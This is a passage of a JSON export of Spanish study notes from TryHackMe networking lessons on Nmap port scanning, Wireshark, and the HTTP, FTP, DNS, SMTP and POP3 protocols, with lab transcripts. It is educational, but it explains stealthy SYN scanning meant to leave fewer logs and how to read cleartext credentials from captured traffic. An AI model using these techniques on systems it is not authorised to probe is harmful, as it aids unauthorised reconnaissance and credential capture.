puerto 80 con la flag ACK establecida. El objetivo no respondió ninguna.\n\n![[121.png]]\n\nEs notable que podemos tener más control sobre cómo Nmap descubre dispositivos activos con `-PS[portlist]`, `-PA[portlist]`, `-PU[portlist]` para TCP SYN, TCP ACK, y UDP.\n\nComo aporte final, Nmap ofrece una lista de objetivos con `-sL`. Esto creará una lista de los dispositivos que serán escaneados sin escanearlos. Esto nos sirve para asegurarnos de que los objetivos son los correctos.\n\nLa opción `-sn` no performará análisis agresivos, pero tampoco nos dirá qué servicios están siendo utilizados dónde. Para esto es necesario unos escaneos más \"ruidosos\"."
  },
  {
    "title": "3. Port Scanning - Who is Listening",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/3-port-scanning-who-is-listening/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/3. Port Scanning - Who is Listening.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Antes hemos usado `-sn` para descubrir dispositivos activos. En esta lección veremos como descubrir servicios activos escuchando a estos dispositivos. Por diseño, TCP tiene 65535 puertos y lo mismo para UDP.\n\n------------------\n<h2>Escaneando Puertos TCP</h2>\nLa forma más básica y sencilla de saber si un puerto TCP está abierto es intentar conectarse con `telnet` a dicho puerto.\n\n--------------------\n<h2>Connect Scan</h2>\nPuede ser utilizado usando `-sT`. Intenta completar el three-way handshake con cada objetivo TCP. Si resulta estar abierto y se conecta, Nmap tira la conexión.\n\nEl la imagen de abajo podemos ver que nuestra máquina tiene la IP `192.168.124.148` y el Sistema objetivo tiene TCP en el puerto 22 (abierto) y 23 (cerrado). Marcado con un 1, puedes ver el handshake; con un 2, una conexión intentada a un puerto cerrado.\n\n![[122.png]]\n\n-----------------\n<h2>SYN Scan (Stealth)</h2>\nAl contrario que el escaneo de conexión, el escaneo SYN sólo ejecuta el primer paso del handshake (mandar un paquete TCP SYN). Consecuentemente, nunca se completa el handshake. La ventaja principal es que conlleva menos logs y por eso se considera más sigilosa. Puedes usarlo escribiendo `-sS`.\n\nEn la imagen de debajo, podemos escanear el sistema con el puerto 22 abierto. La parte marcada con un 1, muestra el servicio en escucha respondiendo con un paquete TCP SYN-ACK. Sin embargo, Nmap responde con un TCP RST para no completar el handshake. En la parte marcada con un 2, se muestra una conexión TCP intentándolo en un puerto cerrado. En este caso el intercambio es igual que el del escaneo de conexión.\n\n![[123.png]]\n\n-----------------------\n<h2>Escaneando Puertos UDP</h2>\nAunque la mayoría de los servicios usan TCP para la comunicación, algunos usan UDP. Algunos ejemplos son: DNS, DHCP, NTP (Network Time Protocol), SNMP (Simple Network Management Protocol) y VoIP (Voice over IP). UDP no requiere establecer una conexión y romperla después. Es útil para comunicaciones de broadcast en vivo.\n\nNmap ofrece la opción `-sU` para escanear servicios UDP. La imagen de abajo muestra varias respuestas de destino inalcanzable de ICMP, que es el mensaje que devuelven los puertos UDP cerrados.\n\n![[124.png]]\n\n---------------\n<h2>Limitando los Puertos Objetivo</h2>\nNmap escanea los 1000 puertos más comunes por defecto. De todas formas, esto puede no ser lo que necesitas. Es por eso que Nmap tiene algunas opciones más:\n\n- `-F`: Es para modo rápido, que escanea los 100 puertos más comunes (en lugar de los 1000).\n- `-p[rango]`: Te permite especificar exactamente el rango de puertos que quieres investigar, por ejemplo del 10 al 1024: `-p10-1024`. Si no estableces un inicio irá desde el puerto 1 al que indiques, por ejemplo, del 1 al 25: `-p-25`. Y si quieres mirarlos TODOS, puedes hacer `-p-`, de esta forma mirará desde el 1 hasta el 65535.\n\n------------------\n<h2>Resumen</h2>\n\n| Opción      | Explicación                                  |\n| ----------- | -------------------------------------------- |\n| `-sT`       | Escaneo de conexión, conexión total TCP.     |\n| `-sS`       | Escaneo sigiloso, sólo la primera parte TCP. |\n| `-sU`       | Escaneo UDP.                                 |\n| `-F`        | Modo rápido (100 puertos).                   |\n| `-p[rango]` | Especificar el rango.                        |\n"
  },
  {
    "title": "0. Whireshark - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/0-whireshark-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/0. Whireshark - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "- [[THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/1. Introduction]]\n- [[2. Tool Overview]]\n- [[3. Packet Dissection]]\n- [[4. Packet Navigation]]\n- [[5. Packet Filtering]]\n"
  },
  {
    "title": "3. Packet Dissection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/3-packet-dissection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/3. Packet Dissection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Disección de Paquetes</h2>\n\nTambién conocido como disección de protocolos, investiga los detalles de los paquetes descodificando los protocolos y campos disponibles. Wireshark soporta una gran lista de protocolos para la disección y a parte puedes escribir tus propios scripts de disección. En la [documentación de Wireshark](https://github.com/boundary/wireshark/blob/master/doc/README.dissector) puedes encontrar más información sobre esto.\n\n-----------------\n<h2>Detalles de Paquetes</h2>\n\nPuedes hacer click en un paquete para abrir los detalles (hacer doble click los abrirá en una pestaña nueva). Los paquetes consisten de entre 5 y 7 capas en el modelo OSI. Cada vez que clickemos en una parte del paquete se subrayarán los bytes correspondiente.\n\n![[099.png]]\n\nPodemos ver siete capas distintas en detalle:\n\n1. **El marco (capa 1):** Muestra que tipo de paquete/marco que estamos mirando y los detalles específicos de la capa física de OSI.\n   \n   ![[100.png]]\n   \n2. **Fuente \\[MAC] (capa 2):** Muestra la dirección MAC de salida y destino\n   \n   ![[101.png]]\n   \n3. **Fuente \\[IP] (capa 3):** Muestra las direcciones IPv4 de destino y fuente.\n   \n   ![[102.png]]\n   \n4. **Protocolo (capa 4):** Muestra detalles del protocolo usado (TCP/UDP) y los puertos de origen y destino de la capa de transporte de OSI.\n   \n   ![[103.png]]\n   \n5. **Errores de Protocolo:** La continuación de la fase 4 muestra segmentos específicos de TCP que tuvieron que ser remontados.\n   \n   ![[104.png]]\n   \n6. **Protocolo de Aplicación (capa 5):** Muestra detalles específicos del protocolo usado como HTTP, FTP o SMB de la capa de aplicación del modelo OSI.\n   \n   ![[105.png]]\n   \n7. **Información de Aplicación:** Esta extensión de la quinta capa muestra la información específicas de la aplicación.\n   \n   ![[106.png]]\n\nAhora que sabemos de qué se compone un paquete general, es hora de mirar varios protocolos de aplicación en detalle."
  },
  {
    "title": "2. Tool Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/2-tool-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/2. Tool Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Casos de Uso</h2>\nWireshark es una de las herramientas de análisis de tráfico más potentes disponibles. Tiene varios propósitos:\n\n- Detectar y arreglar problemas de red.\n- Detectar anomalías de seguridad.\n- Investigar y aprender detalles de protocolos.\n\n>[!NOTE] Wireshark no es un IDS (Intrusion Detection System). Sólo permite a los analistas descubrir e investigar los paquetes a fondo.\n\n-----------\n<h2>GUI y Data</h2>\nLa GUI de Wireshark se abre con una sola página todo en uno. A primera vista destacan 5 secciones:\n\n| Sección                           | Descripción                                                                                             |\n| --------------------------------- | ------------------------------------------------------------------------------------------------------- |\n| **Toolbar**                       | Contiene múltiples menús y atajos para sniffeo de paquetes.                                             |\n| **Display Filter Bar**            | La barra principal y sección de filtrado.                                                               |\n| **Recent Files**                  | Lista de archivos recientes.                                                                            |\n| **Capture Filter and Interfaces** | Captura filtros y puntos de sniffeo (escucha). Estos puntos son las interfaces de red (eth0, lo, etc.). |\n| **Status Bar**                    | Estado de herramientas e información de paquetes y perfiles.                                            |\nLa imagen de abajo muestra la interfaz de Wireshark:\n\n![[093 1.png]]\n\n-----------\n<h2>Cargando Archivos PCAP</h2>\nPara abrir un archivo PCAP puedes dárselo como parámetro a `wireshark <archivo_pcap>`, arrastrarlo a la interfaz o seleccionar `File`. Una vez abierto se ve algo así:\n\n![[094 1.png]]\n\nAquí vemos varias secciones:\n\n| Sección             | Descripción                                                         |\n| ------------------- | ------------------------------------------------------------------- |\n| Packet List Pane    | Resumen de cada paquete (fuente, destino, protocolo e información). |\n| Packet Details Pane | Detalle del protocolo del paquete seleccionado.                     |\n| Packet Bytes Pane   | Representación hex y ASCII decodeado  del paquete seleccionado.     |\n\n-------------\n<h2>Coloreando Paquetes</h2>\nA parte de la información rápida, Wireshark también colorea los paquetes de acuerdo a diferentes condiciones y el protocolo para detectar anomalías. Puedes crear tus propias reglas de colores para localizar eventos de interés.\n\nWireshark tiene dos tipos de métodos de coloreo de paquetes. Reglas temporales, sólo disponibles durante una sesión y reglas permanentes, que son guardadas bajo las preferencias de archivos (perfil). Podemos usar `click derecho en menú` o `View -> Coloring Rules`. La opción `Colourise Packet List` activa y desactiva las reglas de coloración. Las reglas temporales se pueden hacer `View -> Conversation Filter`. Así es como se ven las reglas por defecto:\n\n![[095 1.png]]\n\n---------------\n<h2>Sniffeo de Tráfico</h2>\nPodemos usar el botón azul de la aleta de un tiburón para comenzar el sniffeo de la red (capturar tráfico), el botón rojo lo parara y el verde lo reiniciará. La barra de estado también mostrará la interfaz sniffeada y el número de paquetes recolectados.\n\n![[096.png]]\n\n-------------------\n<h2>Fusionar Archivos PCAP</h2>\nWireshark puede combinar dos archivos pcap en uno solo. Para ello podemos hacer `File -> Merge`. Al escoger el segundo archivo, Wireshark mostrará el total de paquetes en el archivo seleccionado. Una vez le damos a `Open`, se fusionará con el archivo pcap existente y creará un archivo pcap nuevo. **Debemos guardar el archivo fusionado antes de poder trabajar sobre él.**\n\n![[097.png]]\n\n-----------------\n<h2>Ver Detalles de Archivo</h2>\nConocer los detalles del archivo es de ayuda. Especialmente cuando trabajamos con múltiples archivos pcap, a veces necesitamos comprobar el file hash, el tiempo de captura, los comentarios, estadísticas, etc. Para ver los detalles: `Statistics -> Capture File Properties` o haciendo click en el icono pcap localizado en la esquina inferior derecha.\n\n![[098.png]]\n"
  },
  {
    "title": "4. Packet Navigation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/4-packet-navigation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/4. Packet Navigation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Números de Paquetes</h2>\nWireshark calcula el número de paquetes investigados y asigna un número único a cada paquete. Esto hace sencillo ir a un paquete concreto.\n\n--------------------\n<h2>Ir a un Paquete</h2>\nNo sólo sirven los números para conocer el total de estos, sino para hacer más sencillo encontrar e investigar paquetes específicos. Además contiene un sistema de seguimiento que te permite moverte entre los paquetes de una misma \"conversación\". Para ello puedes pulsar en `Go` o escribir `frame.number == <número>`.\n\n------------------\n<h2>Encontrar Paquetes</h2>\nA parte del número de paquete, Wireshark puede encontrar paquetes por contenido. Para ello podemos usar `Edit -> Find Packet`. Esto facilita a los analistas encontrar un evento particular.\n\nHay dos puntos cruciales para encontrar paquetes:\n\n- El primero es saber el tipo de input (Display filter, Hex, String y RegEx). Las búsquedas son case insensitive pero se puede cambiar haciendo click en el botón de radio.\n- El segundo es elegir el campo de búsqueda. Puedes llevar a cabo búsquedas en la lista de paquetes, los detalles del paquete y los bytes de paquetes y es de crucial importancia. \n  \n  ![[107.png]]\n\n-------------------\n<h2>Marcar Paquetes</h2>\nEs otra funcionalidad útil para los analistas. Podemos encontrar/apuntar a un paquete específico marcándolo. Se puede desmarcar editándolo. Los paquetes marcados aparecen en negro.\n\n![[108.png]]\n\n-------------------\n<h2>Comentarios de Paquetes</h2>\nPodemos añadir comentarios a los paquetes que consideremos para ayudar a la investigación posterior o recordar algo. Al contrario que el marcado de paquetes, los comentarios pueden pueden permanecer en la captura hasta que alguien los elimina.\n\n![[109.png]]\n\n------------------\n<h2>Exportar Paquetes</h2>\nA veces es necesario separar ciertos paquetes para su análisis del resto de la captura, que puede ser inmensamente grande. Esta funcionalidad permite la selección de ciertos paquetes sospechosos (decided scope). Para ello podemos usar el menú `File -> Export Specified Packets`.\n\n![[110.png]]\n\n-----------------\n<h2>Exportar objetos (archivos)</h2>\nWireshark puede extraer archivos transferidos a trabes de la red. Para un analista de seguridad es clave descubrir qué archivos son compartidos y guardarlos para una posterior investigación. Los tipos de archivos que pueden extraerse son DICOM, HTTP, IMF, SMB y TFTP. Para acceder: `File -> Export Objects`.\n\n![[111.png]]\n\n-----------------\n<h2>Formato de muestra de Tiempo</h2>\nWireshark lista los paquetes a la vez que son capturados, lo que no siempre es óptimo como visualización para la investigación. Por defecto, Wireshark muestra el tiempo en \"Segundos desde el inicio de la Captura\". El uso común es usar el formato UTC Time Display. Para hacerlo: `View -> Time Display Format`.\n\n![[112.png]]\n\n![[113.png]]\n\n-----------------\n<h2>Información para Expertos</h2>\nWireshark también detecta estados específicos de protocolos para ayudarte a detectar y analizar posibles anomalías y problemas. Hágase notar que esto son sólo sugerencias.\n\n| **Severity** | **Colour**   | **Info**                                                                  |\n| ------------ | ------------ | ------------------------------------------------------------------------- |\n| **Chat**     | **Azul**     | Información de flujo normal.                                              |\n| **Note**     | **Cian**     | Eventos notables como errores de código de aplicación.                    |\n| **Warn**     | **Amarillo** | Advertencias como errores de código inusuales o problemas de declaración. |\n| **Error**    | **Rojo**     | Problemas como paquetes mal formados.                                     |\nAlgunos de los grupos de información son:\n\n| **Grupo**      | **Info**                          |\n| -------------- | --------------------------------- |\n| **Checksum**   | Errores de checksum.              |\n| **Comment**    | Detección de paquete comentado.   |\n| **Deprecated** | Uso de protocolo deprecado.       |\n| **Malformed**  | Detección de paquete mal formado. |\nPara verlo podemos hacer uso del botón en la esquina inferior izquierda o `Analyze -> Expert Information`.\n\n![[114.png]]"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "Wireshark es una herramienta de código abierto y multiplataforma de análisis de paquetes capaz de sniffear e investigar el tráfico en vivo y de inspeccionar la captura de paquetes (PCAP). En esta unidad veremos sus usos y como analizar paquetes con ella.\n\n"
  },
  {
    "title": "5. Packet Filtering",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/5-packet-filtering/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/5. Packet Filtering.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Filtrado de Paquetes</h2>\nWireshark tiene un motor de filtrado poderoso que ayuda a estrechar el tráfico. Tiene dos tipos de filtrado: captura y muestra (capture y display).\n\n- Los filtros de captura se utilizan para capturar paquetes válidos para el filtro.\n- Los filtros de muestra se usan para ver aquellos paquetes que cumplen con el requisito.\n\nLos filtros son queries específicas diseñadas para los protocolos disponibles en Wireshark. Aunque los filtros son la única opción para estrechar los resultados, hay dos maneras de introducirlos: mediante \"comandos\" o queries en la barra de filtrado o mediante el click derecho en los menús.\n\n>[!TIP] Si puedes hacer click en él, puedes filtrarlo y copiarlo.\n\n---------------------\n<h2>Apply as Filter</h2>\nEs la forma más básica de filtrar tráfico. Al investigar una captura, puedes hacer click en el campo que quieres filtrar y usar el menú de click derecho o `Analyze -> Apply as Filter`. Una vez aplicado el filtro, Wireshark generará la query necesaria y la aplicará.\n\n![[115.png]]\n\n--------------------\n<h2>Conversation Filter</h2>\nAl usar la opción de `Apply as Filter`, investigas sobre un paquete en concreto. Sin embargo, si quieres investigar sobre la conversación que ha tenido lugar centrándote en las direcciones IP, este tipo de filtro es muy útil porque permite ver sólo los paquetes relacionados. Puedes acceder usando el menú de click derecho o `Analyze -> Conversation Filter`.\n\n![[116.png]]\n\n--------------------------\n<h2>Colourise Conversation</h2>\nEsta opción es similar a la de `Conversation Filter` solo que remarca los paquetes conectados sin aplicar un filtro de muestra. No tiene en cuenta el color del paquete antes de ser aplicado y puede ser accedido con el click derecho o `View -> Colourise Conversation`. Si queremos devolverlo a la normalidad hacemos `View -> Colourise Conversation -> Reset Colourisation`.\n\n![[117.png]]\n\n-------------------\n<h2>Prepare as Filter</h2>\nSimilar a `Apply as Filter`, esta opción crea una muestra usando el click derecho. Sin embargo, no aplica el filtro, sino que sólo lo desarrolla en la barra de queries. Se puede poner otras queries usando `and` u `or`.\n\n![[118.png]]\n\n---------------------\n<h2>Apply as Column</h2>\nPor defecto, la lista de paquetes ofrece información básica sobre cada paquete. Puedes usar el menú de click derecho o `Analyze -> Apply as Column` para añadir columnas al panel de la lista de paquetes. Una vez hecho, será visible en el panel de la lista. Puedes activarlas y desactivarlas haciendo click derecho en la parte superior del panel de paquetes.\n\n![[119.png]]\n\n------------------\n<h2>Follow Stream</h2>\nWireshark muestra todo en flujo de paquetes. Sin embargo, es posible reconstruir el flujo de uno o varios paquetes concretos.\n\nSeguir el flujo del protocolo ayuda a recrear la información a nivel de aplicación y a entender el evento de interés. También es posible ver información que esté en texto claro como nombres de usuario, contraseñas, etc.\n\nPuedes usar el click derecho o `Analyze -> Follow TCP/UDP/HTTP Stream`. Los flujos salen en una nueva pestaña, siendo en azul la respuesta del servidor y en rojo la petición del cliente.\n\n![[120.png]]\n\nUna vez seguido un flujo, Wireshark crea y aplica la query necesaria para seguir el flujo."
  },
  {
    "title": "4. HTTP(S) - Accessing the Web",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/4-http-s-accessing-the-web/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/4. HTTP(S) - Accessing the Web.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Cuando enciendes el buscador, normalmente usas HTTP y HTTPS. Este protocolo se basa en TCP y define cómo tu buscador se relaciona con los servidores web.\n\nAlgunos de los comandos o métodos que tu buscador normalmente manda a los servidores web son:\n\n- `GET`: Recoge información del servidor como un archivo HTML o una imagen.\n- `POST`: Nos permite subir nueva información al server, como una form o un archivo.\n- `PUT`: Usado para crear un nuevo recurso en el servidor o para actualizar o sobrescribir información existente.\n- `DELETE`: Usado para borrar algún archivo o recurso de la red.\n\nHTTP y HTTPS usan, por defecto, los puertos 80 y 443, respectivamente.\n\nAl buscar en el buscador la IP `10.10.178.231`, el buscador nos muestra la página perfectamente, pero ¿qué está pasando por detrás?\n\n![[080.png]]\n\nUsando Wireshark podemos examinar el intercambio entre el buscador y el servidor web. La siguiente imagen muestra el mensaje enviado por nuestro buscador al servidor en rojo y la respuesta del servidor web en azul.\n\n![[081.png]]\n\nComo recordarás, para conectarnos al servidor web usabamos telnet. Para recoger información de este, usábamos `GET / HTTP/1.1`. y `Host: anything`. Podemos recuperar ciertos archivos usando `GET /file.html HTTP/1.1`.\n\n![[082.png]]\n\n"
  },
  {
    "title": "5. FTP - Transferring Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/5-ftp-transferring-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/5. FTP - Transferring Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Al contrario que HTTP, que está diseñado para devolver páginas, FTP está diseñado para transferir archivos.\n\nAlgunos comandos usados por FTP:\n\n- `USER`: Usado para poner el nombre de usuario.\n- `PASS`: Usado para poner la contraseña.\n- `RETR`: (Retrieve) es usado para descargar un archivo del servidor FTP al cliente.\n- `STOR`: (Store) es usado para subir un archivo del cliente al servidor FTP.\n\nFTP escucha en el puerto 21 por defecto. La transferencia de información es hecha mediante otra conexión del cliente al servidor.\n\nAbajo un ejemplo y los pasos seguidos para conectarnos:\n\n- Usamos el nombre de usuario `anonymous` para entrar.\n- Así no necesitamos poner contraseña.\n- Usamos `ls` para ver lo que podemos descargar.\n- `type ascii` para cambiar a modo ascii.\n- `get coffee.txt` para poder obtener el archivo que queremos.\n\n```bash\nuser@TryHackMe$ ftp 10.10.178.231  \nConnected to 10.10.178.231 (10.10.178.231). \n220 (vsFTPd 3.0.5) \nName (10.10.178.231:strategos): anonymous \n331 Please specify the password. \nPassword: \n230 Login successful. \nRemote system type is UNIX. \nUsing binary mode to transfer files. \nftp> ls \n227 Entering Passive Mode (10,10,41,192,134,10). \n150 Here comes the directory listing. \n-rw-r--r--    1 0        0            1480 Jun 27 08:03 coffee.txt \n-rw-r--r--    1 0        0              14 Jun 27 08:04 flag.txt \n-rw-r--r--    1 0        0            1595 Jun 27 08:05 tea.txt 226 \nDirectory send OK. \nftp> type ascii \n200 Switching to ASCII mode. \nftp> get coffee.txt \nlocal: coffee.txt remote: coffee.txt \n227 Entering Passive Mode (10,10,41,192,57,100). \n150 Opening BINARY mode data connection for coffee.txt (1480 bytes). \nWARNING! 47 bare linefeeds received in ASCII mode \nFile may not have transferred correctly. \n226 Transfer complete. \n1480 bytes received in 8e-05 secs (18500.00 Kbytes/sec) \nftp> quit \n221 Goodbye.\n```\n\nUsamos Wireshark para examinar los mensajes intercambiados de cerca. Los mensajes del cliente están en rojo y los del servidor en azul. Algunos comandos difieren entre cliente y servidor. Cuando tu tecleas `ls`, al servidor se le manda `LIST`. Otra cosa a destacar es que el listado de directorios y archivos y el archivo descargado son mandados por otra conexión:\n\n![[083.png]]\n"
  },
  {
    "title": "2. DNS- Remembering Addresses",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/2-dns-remembering-addresses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/2. DNS- Remembering Addresses.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "¿Recuerdas la IP de tus sitios web favoritos? A no ser que sea una IP privada de un dispositivo local, nadie necesita preocuparse de memorizarlas gracias al DNS (Domain Name System).\n\nEl DNS trabaja en la capa de aplicación (7) del modelo ISO OSI. El DNS usa tráfico de UDP en el puerto 53 por defecto y TCP en el puerto 53 como respaldo. Hay muchos tipos de registros DNS pero nos centraremos en los siguientes cuatro:\n\n- Registro A: Este mapea un hostname a una o más direcciones IPv4, por ejemplo, puedes configurar `example.com` para que resuelva a `172.17.2.172`.\n- Registro AAAA: Similar al anterior pero para IPv6.\n- Registro CNAME: Este (Canonical Name), mapea un nombre de dominio a otro nombre de dominio, por ejemplo `www.example.com` a `example.com`.\n- Registro MX: Este (Mail Exchange) especifica el servidor de correo responsable de manejar emails para un dominio.\n\nEn otras palabras, cuando escribes `example.com` en tu servidor, este intenta resolver el nombre del dominio haciendo una query al registro A. Pero cuando intentas mandar un email a `test@example.com`, el servidor de mail hace una query al servidor DNS para encontrar el registro MX.\n\nSi quieres consultar la IP de un dominio puedes usar el comando `nslookup <dominio>`. Esto deja rastro de tráfico, en las peticiones uno y tres se busca en los registros A y AAAA y en los dos y cuatro se reciben las respuestas:\n\n```bash\nuser@TryHackMe$ nslookup www.example.com \nServer:         127.0.0.53 \nAddress:        127.0.0.53#53  \nNon-authoritative answer: \n\tName:   www.example.com \n\tAddress: 93.184.215.14 \n\tName:   www.example.com \n\tAddress: 2606:2800:21f:cb07:6820:80da:af6b:8b2c\n```\n\n```bash\nuser@TryHackMe$ tshark -r dns-query.pcapng -Nn     \n1 0.000000000 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x2e0f A www.example.com OPT     \n2 0.059049584 192.168.66.1 → 192.168.66.89 DNS 102 Standard query response 0x2e0f A www.example.com A 93.184.215.14 OPT     \n3 0.059721705 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x96e1 AAAA www.example.com OPT     \n4 0.101568276 192.168.66.1 → 192.168.66.89 DNS 114 Standard query response 0x96e1 AAAA www.example.com AAAA 2606:2800:21f:cb07:6820:80da:af6b:8b2c OPT\n```\n"
  },
  {
    "title": "6. SMTP - Sending Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/6-smtp-sending-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/6. SMTP - Sending Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Como con buscar en la web y descargar archivos, mandar emails tiene su propio protocolo. Simple Mail Transfer Protocol (SMTP) define cómo el cliente de mail se habla con el servidor y viceversa.\n\nVeamos algunos de los comandos usados por dicho protocolo:\n\n- `HELO` o `EHLO` comienza la sesión.\n- `MAIL FROM` especifica el emisor del mail.\n- `RCPT TO` especifica el receptor del mail.\n- `DATA` indica que el cliente va a empezar a mandar el contenido del mail.\n- `.` se manda en una linea por separado para indicar el final del mail.\n\nA continuación un ejemplo de un email mandado por `telnet`:\n\n```bash\nuser@TryHackMe$ telnet MACHINE_IP 25 \nTrying MACHINE_IP... \nConnected to MACHINE_IP. \nEscape character is '^]'. \n220 example.thm ESMTP Exim 4.95 Ubuntu Thu, 27 Jun 2024 16:18:09 +0000 \nHELO client.thm \n250 example.thm Hello client.thm [10.11.81.126] \nMAIL FROM: <user@client.thm> \n250 OK \nRCPT TO: <strategos@server.thm> \n250 Accepted \nDATA \n354 Enter message, ending with \".\" on a line by itself \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n. \n250 OK id=1sMrpq-0001Ah-UT \nQUIT \n221 example.thm closing connection \nConnection closed by foreign host.\n```\n\nMandar un email por `telnet` es complicado e ineficiente, pero te ayuda a comprender mejor cómo funciona el protocolo. Una imagen de Wireshark (cliente en rojo y servidor en azul) para visualizarlo mejor:\n\n![[084.png]]\n\n"
  },
  {
    "title": "7. POP3 - Receiving Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/7-pop3-receiving-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/7. POP3 - Receiving Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Has recibido un email y quieres descargarlo en tu cliente de mail local. POP3 (Post Office Protocol version 3) está diseñado para permitir la comunicación entre cliente y servidor.\n\nUn email se manda usando SMPT y se recupera usando POP3. Algunos comandos habituales son:\n\n- `USER <username>`: Identifica al usuario.\n- `PASS <password>`: Provee la contraseña del usuario.\n- `STAT`: Pide el número de mensajes y el tamaño total.\n- `LIST`: Lista todos los mensajes y sus tamaños.\n- `RETR <message_number>`: Rescata el mensaje especificado.\n- `DELE <message_number>`: Marca un mensaje para su eliminación.\n- `QUIT`: Termina la sesión POP3, aplicando cambios.\n\nDebajo podemos observar una sesión POP3 en `telnet`:\n\n```bash\nuser@TryHackMe$ telnet 10.10.65.120 110 \nTrying 10.10.65.120... \nConnected to 10.10.65.120. \nEscape character is '^]'. \n+OK [XCLIENT] Dovecot (Ubuntu) ready. \nAUTH \n+OK \nPLAIN . \nUSER strategos \n+OK \nPASS  \n+OK Logged in. \nSTAT \n+OK 3 1264 \nLIST \n+OK 3 messages: \n1 407 \n2 412 \n3 445 \n. \nRETR 3 \n+OK 445 octets \nReturn-path: <user@client.thm> \nEnvelope-to: strategos@server.thm \nDelivery-date: Thu, 27 Jun 2024 16:19:35 +0000 \nReceived: from [10.11.81.126] (helo=client.thm)         \n\tby example.thm with smtp (Exim 4.95)         \n\t(envelope-from <user@client.thm>)         \n\tid 1sMrpq-0001Ah-UT         \n\tfor strategos@server.thm;         \n\tThu, 27 Jun 2024 16:19:35 +0000 \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n. \nQUIT \n+OK Logging out. \nConnection closed by foreign host.\n```\n\nDebajo en una imagen con la letra roja (cliente) y letra azul (servidor):\n\n![[085.png]]\n"
  },
  {
    "title": "0. Networking Core Protocols",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/0-networking-core-protocols/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/0. Networking Core Protocols.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
